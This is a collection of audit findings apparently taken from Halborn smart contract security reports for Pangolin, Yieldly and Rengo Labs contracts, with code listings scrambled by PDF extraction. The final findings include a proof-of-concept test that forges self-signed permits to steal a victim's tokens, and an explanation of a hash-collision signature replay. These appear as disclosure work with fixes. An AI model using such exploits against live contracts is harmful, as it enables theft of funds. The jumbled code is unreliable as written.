MinterChanged ( minter , newMinter ); minter = newMinter ; return true ; Listing 4: PNG.sol (Line 280) 276 function setAdmin ( address newAdmin ) external returns ( bool ) { 277 278 require ( msg . sender == admin , \" Png :: setAdmin : unauthorized \" ); require ( newAdmin != address (0) , \" Png :: setAdmin : cannot make  zero address the admin \"); emit AdminChanged ( admin , newAdmin ); admin = newAdmin ; return true ; 279 280 281 282 } 15 Airdrop.sol Listing 5: Airdrop.sol (Line 73) 70 function setOwner ( address owner_ ) external { 71 require ( owner_ != address (0) , ' Airdrop :: setOwner : invalid new  owner '); require ( msg . sender == owner , ' Airdrop :: setOwner : unauthorized '  ); owner = owner_ ; 72 73 74 } Listing 6: Airdrop.sol (Line 81) 79 80 81 82 function setWhitelister ( address addr ) external { require ( msg . sender == owner , ' Airdrop :: setWhitelister :  unauthorized '); whitelister = addr ; } Risk Level: Likelihood - 3 Impact - 3 Recommendation: It is recommended to implement a two-step process where the owner nominates an account and the nominated account must call an acceptOwnership() function for the transfer of ownership to succeed. This ensures the nominated EOA account is a valid and active account. Remediation Plan: RISK ACCEPTED: Pangolin team accepts this risk: - Airdrop events will last for a short time, and it is expected that ownership will only be transferred once from the deployer to the multisig. - PNG Ownership will only be transferred from the deployer to the Timelock 16 contract (contracts/governance/Timelock.sol). This Timelock contract has the suggested two-step ownership transfer pattern, and any additional change of ownership would likely go through Timelock rather than PNG. 17 ", "labels": ["Halborn", "Pangolin_Exchange", "Severity: Medium"]}, {"title": "DOS WITH BLOCK GAS LIMIT", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Pangolin_Exchange_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In the contract TreasuryVester the distribute() function is used to distribute the tokens to recipients based on their allocation: TreasuryVester.sol Listing 7: TreasuryVester.sol (Line 149) 70 function distribute () public { 71 require ( vestingEnabled , \" TreasuryVester :: distribute : vesting  is not enabled \"); require ( 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 block . timestamp >= lastUpdate + VESTING_CLIFF , \" TreasuryVester :: distribute : it is too early to distribute  \" ); lastUpdate = block . timestamp ; // defines a vesting schedule that lasts for 30 months if ( step % STEPS_TO_SLASH == 0) { uint slash = step / STEPS_TO_SLASH ; if ( slash < 5) { _vestingPercentage = _initialVestingPercentages [ slash  ]; } else if ( slash < 12) { _vestingPercentage -= 20; } else if ( slash < 20) { _vestingPercentage -= 15; } else if ( slash < 30) { _vestingPercentage -= 10; } else { revert ( \" TreasuryVester :: distribute : vesting is over \" ); } _vestingAmount = getVestingAmount () ; } step ++; // distributes _vestingAmount of tokens to recipients based on 18  their allocation for ( uint i ; i < _recipientsLength ; i ++) { Recipient memory recipient = _recipients [ i ]; uint amount = recipient . allocation * _vestingAmount /  DENOMINATOR ; if (! recipient . isMiniChef ) { // simply mints or transfer tokens to regular  recipients vestedToken . mint ( recipient . account , amount ); } else { // calls fund rewards of minichef after minting tokens  to self vestedToken . mint ( address ( this ) , amount ); vestedToken . approve ( recipient . account , amount ); IMiniChefV2 ( recipient . account ). fundRewards ( amount ,  VESTING_CLIFF ); } } emit TokensVested ( _vestingAmount ); 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 } As the length of recipients is not limited, in case that there are too many recipients, the block gas limit could be reached, causing miners to not respond to all distribute() calls, thus blocking the main purpose of the smart contract. Risk Level: Likelihood - 1 Impact - 5 Recommendation: It is recommended to add a require statement in the setRecipients()  function of the TreasuryVester contract that limits the number of recipients. 19 Remediation Plan: SOLVED: 1e2f374c6728b998a22045a673be0ba14156b9c1. Pangolin team solved the issue in the commit id 20 ", "labels": ["Halborn", "Pangolin_Exchange", "Severity: Medium"]}, {"title": "MISSING ZERO ADDRESS CHECKS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Pangolin_Exchange_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In the TreasuryVester and Airdrop contracts, the constructors are missing address validation. On the other hand, in some functions it is also critical to perform this validation. For example, in the TreasuryVester  .setRecipients() function, if a 0 address recipient was set the distribute() call would always fail, since most tokens cannot be minted at the 0 address. Each address should be validated and checked to be non-zero. Code location: TreasuryVester.sol Listing 8: TreasuryVester.sol (Line 87) address newVestedToken , uint newStartingBalance , Recipient [] memory newRecipients , address newGuardian 78 constructor ( 79 80 81 82 83 ) { 84 require ( newStartingBalance > 0, \" TreasuryVester :: Constructor :  invalid starting balance \" ); require ( newGuardian != address (0) , \" TreasuryVester ::  Constructor : invalid guardian address \"); guardian = newGuardian ; vestedToken = IPng ( newVestedToken ); startingBalance = newStartingBalance ; setRecipients ( newRecipients ); 85 86 87 88 89 90 } 21 Listing 9: TreasuryVester.sol (Line 187) 170 function setRecipients ( Recipient [] memory newRecipients ) public  onlyOwner { 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 } _recipientsLength = newRecipients . length ; require ( _recipientsLength != 0 , \" TreasuryVester :: setRecipients : invalid recipient number \" ); uint allocations ; for ( uint i ; i < _recipientsLength ; ++ i ) { Recipient memory recipient = newRecipients [ i ]; require ( recipient . account != address (0) , \" TreasuryVester :: setRecipients : invalid recipient  address \" ); require ( recipient . allocation != 0 , \" TreasuryVester :: setRecipients : invalid recipient  allocation \" ); _recipients [ i] = recipient ; allocations += recipient . allocation ; } require ( allocations == DENOMINATOR , \" TreasuryVester :: setRecipients : invalid total allocation \" ); emit RecipientsChanged ( newRecipients ); Airdrop.sol Listing 10: Airdrop.sol (Lines 45-47) 38 constructor ( 39 40 41 42 43 ) { 44 45 uint supply_ , address png_ , address owner_ , address remainderDestination_ airdropSupply = supply_ ; png = png_ ; 22 owner = owner_ ; remainderDestination = remainderDestination_ ; 46 47 48 } Listing 11: Airdrop.sol (Line 62) 57 function setRemainderDestination ( address remainderDestination_ )  external { require ( 58 59 60 61 62 63 } msg . sender == owner , ' Airdrop :: setRemainderDestination : unauthorized ' ); remainderDestination = remainderDestination_ ; PNG.sol Listing 12: PNG.sol (Line 267) 264 function setMinter ( address newMinter ) external returns ( bool ) { 265 266 267 268 269 } require ( msg . sender == admin , \" Png :: setMinter : unauthorized \" ); emit MinterChanged ( minter , newMinter ); minter = newMinter ; return true ; Risk Level: Likelihood - 3 Impact - 2 Recommendation: It is recommended to validate that each address input is non-zero. 23 Remediation Plan: SOLVED: 8810acc38f27bf9de25a492ffe41d3c54c657c5f. Pangolin team solved the issue in the commit id 24 ", "labels": ["Halborn", "Pangolin_Exchange", "Severity: Low"]}, {"title": "USING ++I CONSUMES LESS GAS THAN I++ IN LOOPS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Pangolin_Exchange_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In some for loops, the variable i is incremented using i++. It is known that, in loops, using ++i costs less gas per iteration than i++. Code Location: TreasuryVester.sol - Line 149: for (uint i; i < _recipientsLength; i++){ Airdrop.sol - Line 178: for (uint i = 0; i < addrs.length; i++){ Proof of Concept: For example, based in the following test contract: Listing 13: Test.sol 1 // SPDX - License - Identifier : MIT 2 pragma solidity 0.8.9; 3 4 contract test { 5 6 7 8 9 10 11 12 13 } } function postiincrement ( uint256 iterations ) public { for ( uint256 i = 0; i < iterations ; i ++) { } } function preiincrement ( uint256 iterations ) public { for ( uint256 i = 0; i < iterations ; ++ i) { } 25 We can see the difference in the gas costs: Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to use ++i instead of i++ to increment the value of an uint variable inside a loop. This is not applicable outside of loops. Remediation Plan: SOLVED: 4aa439b03eac34bebf40c6b72e9afeb2d0fa2333. Pangolin team solved the issue in the commit id 26 ", "labels": ["Halborn", "Pangolin_Exchange", "Severity: Informational"]}, {"title": "UNNEEDED INITIALIZATION OF UINT VARIABLES TO ZERO", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Pangolin_Exchange_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "Since i is an uint, it is already initialized to 0. uint i = 0 reassigns the 0 to i which wastes gas. The same applies to the lower state variable shown below. Code Location: Airdrop.sol - Line 178: for (uint i = 0; i < addrs.length; i++){ PNG.sol - Line 373: uint32 lower = 0; Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended not to initialize uint variables to 0 to save gas. For example: for (uint i; i < addrs.length; ++i){ Remediation Plan: SOLVED: 87781621d7294afeafd7a33916b4016dc1f3ed34. Pangolin team solved the issue in the commit id 27 ", "labels": ["Halborn", "Pangolin_Exchange", "Severity: Informational"]}, {"title": "POSSIBLE MISUSE OF PUBLIC FUNCTIONS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Pangolin_Exchange_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In the TreasuryVester and PNG contracts, there are some functions marked as public that are never called directly within the contract itself or in any of their descendants: TreasuryVester.sol - distribute() (TreasuryVester.sol#122-163) PNG.sol - delegate() (PNG.sol#314-316) - delegateBySig() (PNG.sol#327-336) - getPriorVotes() (PNG.sol#355-387) Risk Level: Likelihood - 1 Impact - 1 Recommendation: If the functions are not intended to be called internally or by their descendants, it is better to mark them as external to reduce gas costs. Remediation Plan: SOLVED: f1fff4b75db0fe70450c55234418bd445834029d. Pangolin team solved the issue in the commit id 28 ", "labels": ["Halborn", "Pangolin_Exchange", "Severity: Informational"]}, {"title": "LACK OF THRESHOLD CHECK", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Algorand Smart Contract Audit/Yieldly_Finance_Bridge_Algorand_Smart_Contract_Security_Audit_Halborn_v_1_1.pdf", "body": "In the Yieldly.Finance, Three type of role is defined in the bridge contracts. They are named as Signatory and Validator and Dispatcher. Signatory and validator thresholds have been implemented in an editable way on the related functions. However, there is no limit on these functions. Code Location: Function sigThresholdProp Listing 1: HalbornTest.js (Lines ) 1 it ( \" Halborn Should propose threshold should change to 20 \" , async () => { return await new Promise ( async ( resolve , reject ) = > { try { let txn = await configs . sigThresholdProp ( account1 , sigAppId , 2 3 4 20) ; resolve ( txn ); } catch ( err ) { 5 6 7 8 9 10 }) . timeout (120000) ; } }) ; console . log ( err ); Function valThresholdProp Listing 2: HalbornTest.js (Lines ) 1 it ( \" Halborn Should propose threshold should change to 20 \" , async () => { return await new Promise ( async ( resolve , reject ) = > { try { let txn = await configs . valThresholdProp ( account1 , valAppId , 2 3 4 13 20 , sigAppId ); resolve ( txn ); } catch ( err ) { 5 6 7 8 9 10 11 }) . timeout (120000) ; } }) ; reject () ; assert . fail ( \" Failed to propose \" ); Example Functions: Listing 3 1 valThresholdProp 2 sigThresholdProp Risk Level: Likelihood - 3 Impact - 3 Recommendation: The limit definition range of threshold should be defined in the contract functionalities. Remediation Plan: SOLVED: Yieldly.Finance Team defined threshold limit on the functions. 14 MANUAL TESTING 15 During the manual testing multiple questions where considered while eval- uation each of the defined functions:  Can it be re-called changing admin/roles and permissions?  Do we control sensitive or vulnerable parameters?  Does the function check for boundaries on the parameters and internal values? Bigger than zero or equal? Argument count, array sizes, integer truncation.  Can we bypass Proxy restrictions and interact with the escrow di- rectly?  Can we manipulate transaction order with re-ordering?  Is there any missed address check? 4.1 TESTING SIGNATORY/VALIDATOR FUNCTIONS ACCESS CONTROL CHECK: During the test process, Two type of user have been defined on the contracts. One of them is defined as signatory and other one named as validator. In the testing process, Functions accessible to relevant users have been checked. A signatory user functions are shown in the below. Listing 4: Functions (Lines ) 1 function isSignatory () 2 function sigThresholdProp () 3 function signatoryProp () 4 function signatoryApprove () 5 function Next, privileged validator functions are extracted from the test cases and shown below. 16 G N I T S E T L A U N A M Listing 5: Functions (Lines ) 1 function isValidator () 2 function addValidatorProp () 3 function valThresholdProp () All functions are tested through Mocha framework. Two accounts provided by Yieldly .Finance team and one account has been created by Halborn team. After importing accounts into Mocha and AlgoSDK, Signatory and Validator workflows are evaluated according to the following code parts. Tests are completed through Algorand Testnet. Listing 6: IsValidator Check (Lines ) let txn = await configs . isValidator ( account1 , valAppId ); resolve ( txn ); } catch ( err ) { try { } }) ; reject () ; assert . fail ( \" Failed to propose \" ); 1 it ( \" Halborn Test Validator Check - PASS \" , async () = > { 2 return await new Promise ( async ( resolve , reject ) = > { 3 4 5 6 7 8 9 10 11 }) . timeout (120000) ; 12 13 it ( \" Halborn Test Validator Check - FAIL \" , async () = > { 14 return await new Promise ( async ( resolve , reject ) = > { 15 16 17 18 19 20 21 22 }) . timeout (120000) ; 23 } catch ( err ) { resolve () ; } }) ; try { let txn = await configs . isValidator ( account2 , valAppId ); reject ( assert . fail ( \" Should have failed \" )) ; Listing 7: Add Validatory and Approve Check (Lines ) 1 it ( \" Halborn Test Add Validator - PASS \" , async () = > { 2 return await new Promise ( async ( resolve , reject ) = > { 17 G N I T S E T L A U N A M try { } }) ; let txn = await configs . addValidatorProp ( account1 , valAppId , account2 , sigAppId ); resolve ( txn ); } catch ( err ) { reject () ; assert . fail ( \" Failed to propose \" ); 3 4 5 6 7 8 9 10 11 12 13 14 15 16 }) . timeout (120000) ; 17 18 it ( \" Halborn Test Validator Approve \" , async () = > { 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 }) . timeout (120000) ; reject () ; assert . fail ( \" Failed to propose \" ); ); resolve ( txn ); } catch ( err ) { account2 , valAppId , account2 , sigAppId let txn = await configs . validatorApprove ( } }) ; try { return await new Promise ( async ( resolve , reject ) = > { G N I T S E T L A U N A M Listing 8: Validator Threshold Change Check (Lines ) return await new Promise ( async ( resolve , reject ) = > { 1 it ( \" Halborn Added Validator Threshold Change Check \" , async () => { 2 3 4 let txn = await configs . valThresholdApprove ( account2 , try { valAppId , sigAppId ); resolve ( txn ); } catch ( err ) { reject () ; assert . fail ( \" Failed to propose \" ); } 5 6 7 8 9 18 }) ; 10 11 }) . timeout (120000) ; Listing 9: Signatory Check (Lines ) let txn = await configs . isSignatory ( account3 , sigAppId ); reject ( assert . fail ( \" Should have failed \" )) ; return await new Promise ( async ( resolve , reject ) = > { try { } catch ( err ) { resolve () ; 1 it ( \" Halborn Signatory Check \" , async () = > { 2 3 4 5 6 7 8 9 10 }) . timeout (120000) ; 11 12 it ( \" Halborn Add Signatory Check \" , async () = > { 13 14 15 } }) ; try { return await new Promise ( async ( resolve , reject ) = > { let txn = await configs . signatoryProp ( account1 , sigAppId , account2 ); resolve ( txn ); } catch ( err ) { 16 17 18 19 20 21 22 }) . timeout (120000) ; } }) ; reject () ; assert . fail ( \" Failed to propose \" ); Listing 10: Signatory Threshold Change (Lines ) G N I T S E T L A U N A M return await new Promise ( async ( resolve , reject ) = > { 1 it ( \" Halborn Signatory Threshold Change \" , async () = > { 2 3 4 try { let txn = await configs . sigThresholdProp ( account1 , sigAppId , 2) ; resolve ( txn ); } catch ( err ) { 5 6 7 8 9 10 11 }) . timeout (120000) ; } }) ; reject () ; assert . fail ( \" Failed to propose \" ); 19 By running the relevant codes on each function, the results were examined on Testnet. As a result of the tests performed in a limited time, no problems were observed in the flows. According to an analysis, It has been observed that the transactions produced by the functions against workflow manipulation are as expected. The Function enhancements are structured with roles. G N I T S E T L A U N A M 20 INPUT VALIDATION CHECK: During the test process, the signatory and validator functions have been reviewed by the auditors. In the testing process, Functions accessible to relevant users have been checked. Without pragma version definition, The contract will be interpreted as a version 1 contract. In the contracts, the pragma version 3 used. Bridge Signatory Contract Listing 11: (Lines 1) 1 # pragma version 3 2 3 4 // ** Begin 5 // ** Descrption : Checks if not first time created , if so then initialise all global variables 6 // **/ 7 int 0 8 txn ApplicationID 9 == 10 bz not_creation 11 byte \" Creator \" 12 txn Sender 13 app_global_put 14 byte \" Owner \" 15 txn Sender 16 app_global_put Bridge Validators Contract Listing 12: (Lines 1) 1 # pragma version 3 2 3 4 // ** Begin 5 // ** Descrption : Checks if not first time created , if so then initialise all global variables 6 // **/ 21 G N I T S E T L A U N A M 7 int 0 8 txn ApplicationID 9 == 10 bz not_creation 11 byte \" Creator \" 12 txn Sender 13 app_global_put 14 byte \" Owner \" 15 txn Sender 16 app_global_put OUT OF ORDER CHECK: In the smart contracts, the grouped transactions are examined by changing their orders. The relevant changes are completed on the test cases. Function valThresholdPropReverse Listing 13: HalbornTest.js (Lines ) return await new Promise ( async ( resolve , reject ) = > { 1 it ( \" valThresholdPropReverse - Reverse \" , async () = > { 2 3 4 let txn = await configs . valThresholdPropReverse ( account1 , try { valAppId , 2, sigAppId ); resolve ( txn ); } catch ( err ) { 5 6 7 8 9 10 11 }) . timeout (120000) ; } }) ; console ( \" ERROR Reverse valThresholdPropReverse \" ); console . log ( err ); Function signatoryApproveReverse 22 G N I T S E T L A U N A M Listing 14: HalbornTest.js (Lines ) 1 it ( \" signatoryApproveReverse - Reverse Orders \" , async () = > { 2 return await new Promise ( async ( resolve , reject ) = > { 3 4 let txn = await configs . signatoryApproveReverse ( account2 , try { sigAppId , account3 ); resolve ( txn ); } catch ( err ) { 5 6 7 8 9 10 }) . timeout (12000) ; } }) ; console . log ( \" ERROR - REVERSE \" ); Function addValidatorPropReverse Listing 15: HalbornTest.js (Lines ) let txn = await configs . addValidatorPropReverse ( return await new Promise ( async ( resolve , reject ) = > { try { account1 , valAppId , account2 , sigAppId 1 it ( \" addValidator Reverse Order \" , async () = > { 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 }) . timeout (120000) ; ); resolve ( txn ); } catch ( err ) { } }) ; console ( \" ERROR Reverse addValidatorPropReverse \" ); console . log ( err ); Function Reverse Group Example Listing 16: Function Reverse Group Example (Lines ) 1 2 var txngroup = await algosdk . assignGroupID ([ application , verifier ]) ; 23 G N I T S E T L A U N A M 3 4 5 6 7 8 9 10 11 application . group = txngroup [1]. group ; verifier . group = txngroup [0]. group ; var signed2 = await application . signTxn ( account . sk ); var signed1 = await verifier . signTxn ( account . sk ); var bytes = concatArrays ( signed1 , signed2 ); var { txId : createTxId } = await algodClient The tests were carried out in interaction with Testnet over the Mocha. G N I T S E T L A U N A M As a result of the tests, Reversed orders are checked on the grouped transactions. 24 4.2 TESTING DISPATCHER FUNCTIONS ACCESS CONTROL CHECK: The Dispatcher is is designed to integrate a diverse set of blockchains There are three role based on the specialised for different needs. components. The final test carried out through dispatcher role. Listing 17: Bridge Dispatcher Teal (Lines ) var appArgs = []; appArgs . push ( algosdk . decodeAddress ( escrowAddress ). publicKey ); appArgs . push ( new Uint8Array ( getInt64Bytes ( proxyAppId )) ); txnList . push ( ) ); ..... configs . updateApplication ( account1 , optingAppId , program6 , program2 , appArgs 514 it ( \" Halborn - Dispatcher New Escrow \" , async () = > { 515 516 517 518 519 520 521 522 523 524 525 526 527 528 529 530 531 532 533 534 535 536 537 538 539 540 541 542 543 ); 544 .... 545 546 }) . timeout (120000) ; account1 , proxyAppId , program7 , program2 , appArgs5 return new Promise (( resolve ) => resolve () ); configs . updateApplication ( ) /* Update the proxy checks */ var appArgs5 = []; appArgs5 . push ( algosdk . decodeAddress ( escrowAddress ). publicKey ); appArgs5 . push ( new Uint8Array ( getInt64Bytes ( disAppId )) ); appArgs5 . push ( new Uint8Array ( getInt64Bytes ( optingAppId )) ); txnList . push ( 25 G N I T S E T L A U N A M Listing 18: (Lines ) 514 it ( \" Halborn - Dispatch From Account 1 and Vote Account 2 \" , async () => { return await new Promise ( async ( resolve , reject ) = > { let txn = await configs . releaseTxnApprove ( try { account1 , disAppId , escrowAddress , account2 , valAppId , assetId , 800000000 , proxyAppId 515 516 517 518 519 520 521 522 523 524 525 526 527 528 529 530 531 532 }) . timeout (120000) ; } catch ( err ) { resolve () ; } }) ; ); assert (! txn , \" Should have failed \" ); Listing 19: (Lines ) 514 it ( \" Halborn - Dispatch From Account 2 and Vote Account 3 \" , async 515 516 517 518 519 520 521 522 523 524 525 526 527 528 529 G N I T S E T L A U N A M () => { return await new Promise ( async ( resolve , reject ) = > { try { let txn = await configs . releaseTxnApproveNoTxn ( account2 , disAppId , account3 , valAppId , assetId , proxyAppId ); assert (! txn , \" Should have failed \" ); } catch ( err ) { resolve () ; } }) ; 26 530 }) . timeout (120000) ; According to an analysis, It has been observed that the transactions produced by the functions against workflow manipulation are as expected. The Function enhancements are structured with roles. G N I T S E T L A U N A M 27 INPUT VALIDATION CHECK: During the test process, the dispatcher function has been reviewed by the auditors. In the testing process, Functions accessible to relevant users have been checked. Without pragma version definition, The contract will be interpreted as a version 1 contract. In the dispatcher contract, the pragma version 3 used. Bridge Dispatcher Teal Listing 20: (Lines 1) 1 # pragma version 3 2 3 4 // ** Begin 5 // ** Descrption : Checks if not first time created , if so then initialise all global variables 6 // **/ 7 int 0 8 txn ApplicationID 9 == 10 bz not_creation 11 byte \" Creator \" 12 txn Sender 13 app_global_put 14 byte \" Owner \" 15 txn Sender 16 app_global_put G N I T S E T L A U N A M The Contract implementations should check GroupSize to make sure the size corresponds to the number of transactions the logic is expecting. Function voteFin 28 Listing 21: Bridge Dispatcher Teal (Lines 515,516,517) 514 voteFin : 515 global GroupSize 516 int 3 517 == 518 assert 519 int 1 520 return 521 522 failed : 523 int 0 524 return 525 finished : 526 int 1 527 return 528 According to test results, Group Size precondition checks are implemented over all contracts. The contract code should verify that the RekeyTo property of any trans- action is set to the ZeroAddress unless the contract is specifically involved in a rekeying operation. Listing 22: Bridge Dispatcher Teal (Lines ) 463 // ** Function : sendTxn 464 // ** Descrption : 465 // **/ 466 sendTxn : 467 gtxn 0 ApplicationID 468 byte \" G\" 469 app_global_get 470 == 471 assert 472 473 gtxn 3 TypeEnum 474 int 4 475 == G N I T S E T L A U N A M 29 476 assert 477 478 int 1 479 byte \" SendAmount \" 480 app_local_get 481 gtxn 3 AssetAmount 482 >= 483 assert 484 485 gtxn 2 RekeyTo 486 global ZeroAddress 487 == 488 gtxn 3 RekeyTo 489 global ZeroAddress 490 == 491 && 492 assert According to the static analysis results, necessary controls were applied on the ReKeyTo variables of contracts. G N I T S E T L A U N A M 30 THANK YOU FOR CHOOSING", "labels": ["Halborn", "Yieldly_Finance_Bridge_Algorand", "Severity: Medium"]}, {"title": "UNLIMITED ALLOWANCE APPROVALS USING FORGED PERMITS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Casper Smart Contract Audits/Rengo_Labs_Uniswaap_Core-Router_Casper_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "It was observed that the permit function, inside the erc20 and pair contracts, does not check if the callers public_key equals to the owner public_key, which makes it vulnerable to self-signed messages. This vulnerability allows an attacker to self sign a message to spend funds from any account, including pairs of liquidity allowances. As a result, an adversary could steal the liquidity token from every user of the protocol and withdraw the funds from the pairs. Code Location: Down below is the code snippet from the permit function: Listing 1: /pair/pair/src/pair.rs (Lines 797,799) 795 fn permit ( 796 797 798 799 800 801 802 803 804 ) { & mut self , public_key : String , signature : String , owner : Key , spender : Key , value : U256 , deadline : u64 , let domain_separator : String = data :: get_domain_separator  () ; 805  () ; 806  ; 807 808 let permit_type_hash : String = data :: get_permit_type_hash let nonce : U256 = self . nonce ( Key :: from ( self . get_caller () )) let deadline_into_blocktime : BlockTime = BlockTime :: new ( deadline 17 809 810 . checked_mul (1000) . ok_or ( Error ::  UniswapV2CorePairMultiplicationOverFlow8 ) 811 812 813 814 815 816 817 . unwrap_or_revert () , ); let blocktime : BlockTime = runtime :: get_blocktime () ; if deadline_into_blocktime >= blocktime { let data : String = format! ( \" {}{}{}{}{}{} \" , permit_type_hash , owner , spender , value , nonce ,  deadline 818 819 820 821 822 ); let hash : [ u8 ; 32] = keccak256 ( data . as_bytes () ); let hash_string : String = hex :: encode ( hash ); let encode_packed : String = format! ( \" {}{} \" ,  domain_separator , hash_string ); 823 824 825  owner ); 826 827 828 829 let digest : [ u8 ; 32] = hash_message ( encode_packed ); let digest_string : String = hex :: encode ( digest ); let digest_key : String = format! ( \" {}{} \" , \" digest_ \" , set_key (& digest_key , digest_string ); self . set_nonce ( Key :: from ( self . get_caller () )) ; let result : bool = self . ecrecover ( public_key , signature , digest , Key  :: from ( self . get_caller () )) ; 830 831  ); 832 833 834 835 836 837 838 839 if result == true { Allowances :: instance () . set (& owner , & spender , value self . emit (& PAIREvent :: Approval { owner : owner , spender : spender , value : value , }) ; } else { // signature verification failed runtime :: revert ( Error ::  UniswapV2CorePairFailedVerification ); 840 841 842 843 844 845 } } else { // deadline is equal to or greater than blocktime runtime :: revert ( Error :: UniswapV2CorePairExpire ); } } 18 Risk Level: Likelihood - 5 Impact - 5 Proof Of Concept: Listing 2 get_permit_type_and_domain_separator ( NAME , contract_hash ); }; // Create the digest of the permit : ` victim_owner ` gives ` Key :: Hash ( hash ) => ContractHash :: new ( hash ) , _ => panic! ( \" Contract hash not found \" ) , // Config let amount = U256 :: from (100 u128 ); let deadline = U256 :: from (10000000000000000000 u128 ); let ( domain_separator , permit_type_hash ) = 0 #[ test ] 1 fn test_invalid_permit () { // Deploy the contract 2 let ( env , token , victim_owner , _ , _ ) = deploy_with_keys () ; 3 let attacker_spender = env . next_user_with_keys () ; 4 5 let contract_hash = match token . contract_hash () { 6 7 8 9 10 11 12 13 14 15 16  attacker_spender ` the right to spend ` amount ` tokens 17  Here we use the nonce of the attacker_spender 18 19 20 21 22 23 24 25 26 27 28  ecrecover 29  public . to_bytes () ; & domain_separator , & permit_type_hash , & Key :: from ( victim_owner . account_hash ). to_string () , & Key :: from ( attacker_spender . account_hash ). to_string () , amount , nonce , deadline , let nonce = token . nonce ( attacker_spender . account_hash ); // let attacker_public_key_bytes = attacker_spender . keypair . let ( digest , _digest_string ) = make_digest ( ); // Some manipulation to make the public_key understandable by 19 // Call permit with malicious payload // The attacker wants to give allowance to himself to spend ` let attacker_public_key_string = format_for_ecrecover (& // SELF SIGN WITH THE ATTACKER KEYPAIR ( ILLEGIT ) let signature_by_attacker_bytes = attacker_spender . keypair . let signature_by_attacker_string = format_for_ecrecover (& ); token . permit ( attacker_spender . account_hash , attacker_public_key_string , signature_by_attacker_string , Key :: from ( victim_owner . account_hash ) , Key :: from ( attacker_spender . account_hash ) , amount , deadline . as_u64 () , 30  attacker_public_key_bytes ); 31 32 33  sign (& digest ). to_bytes () ; 34  signature_by_attacker_bytes ); 35 36 37  amount ` tokens from ` victim_owner ` ( ILLEGIT ) 38 39 40 41 42 43 44 45 46 47 48  amount ` tokens from ` victim_owner ` ( ILLEGIT ) 49 50 51 52 53 54 55 56 57 58  amount ` tokens from ` victim_owner ` ( ILLEGIT ) 59 60 61 62 63 64 65 66  ) ) , amount , \" Allowance should be set \" , attacker_spender . account_hash , Key :: from ( victim_owner . account_hash ) , Key :: from ( attacker_spender . account_hash ) , amount , token . transfer_from ( token . allowance ( assert_eq! ( ); ); Key :: from ( victim_owner . account_hash ) , Key :: from ( attacker_spender . account_hash ) // Now ` attacker_spender ` should have the right to spend ` // Now ` attacker_spender ` should have the right to spend ` // Now ` attacker_spender ` should have ` amount ` tokens ( ILLEGIT 20 assert_eq! ( token . balance_of ( Key :: from ( attacker_spender . account_hash )) amount , \" Balance should be set \" , ); 67 68  , 69 70 71 72 } Recommendation: It is recommended to implement security controls to ensure owner: Key and owner_pubkey: Public Key belong to the same account. Reference: Uniswap permit implementation Remediation Plan: SOLVED: The issue was solved in the commit 24dd7 by removing the permit function. 21 ", "labels": ["Halborn", "Rengo_Labs_Uniswaap_Core-Router_Casper", "Severity: Critical"]}, {"title": "SIGNATURE REPLAY USING HASH COLLISION IN PERMIT FUNCTION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Casper Smart Contract Audits/Rengo_Labs_Uniswaap_Core-Router_Casper_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "It was observed that inside the erc20 and pair contracts, the permit function creates data String without any delimiters between parameters, which makes it vulnerable to hash collision attacks. Using this vulnerability, an attacker can use the same signature more than once with different values to steal tokens from the owner. To explain this vulnerability with an example; data is created as the following: value, nonce, deadline. permit_type_hash, owner, spender, if respectively these parameters are; test X Y 10100 0 1100 then the string becomes testXY101000100 and then it becomes a hash. However, the same string can be obtained using the following parameters, even with an updated nonce value. test X Y 101000 1 100 => testXY101000100 Therefore, an attacker can first use the first allowance, and then can manipulate the value and deadline parameters to be compatible with nonce in order to obtain the same data string. An attacker can use the same hash unlimited times with different amounts. 22 Code Location: Down below is the code snippet from the permit function: Listing 3: /pair/pair/src/pair.rs (Lines 815-820) 795 fn permit ( 796 797 798 799 800 801 802 803 804 ) { & mut self , public_key : String , signature : String , owner : Key , spender : Key , value : U256 , deadline : u64 , let domain_separator : String = data :: get_domain_separator  () ; 805  () ; 806  ; 807 808 809 810 let permit_type_hash : String = data :: get_permit_type_hash let nonce : U256 = self . nonce ( Key :: from ( self . get_caller () )) let deadline_into_blocktime : BlockTime = BlockTime :: new ( deadline . checked_mul (1000) . ok_or ( Error ::  UniswapV2CorePairMultiplicationOverFlow8 ) 811 812 813 814 815 816 817 . unwrap_or_revert () , ); let blocktime : BlockTime = runtime :: get_blocktime () ; if deadline_into_blocktime >= blocktime { let data : String = format! ( \" {}{}{}{}{}{} \" , permit_type_hash , owner , spender , value , nonce ,  deadline 818 819 820 821 822 ); let hash : [ u8 ; 32] = keccak256 ( data . as_bytes () ); let hash_string : String = hex :: encode ( hash ); let encode_packed : String = format! ( \" {}{} \" ,  domain_separator , hash_string ); 823 824 825  owner ); 826 let digest : [ u8 ; 32] = hash_message ( encode_packed ); let digest_string : String = hex :: encode ( digest ); let digest_key : String = format! ( \" {}{} \" , \" digest_ \" , set_key (& digest_key , digest_string ); 23 827 828 829 self . set_nonce ( Key :: from ( self . get_caller () )) ; let result : bool = self . ecrecover ( public_key , signature , digest , Key  :: from ( self . get_caller () )) ; 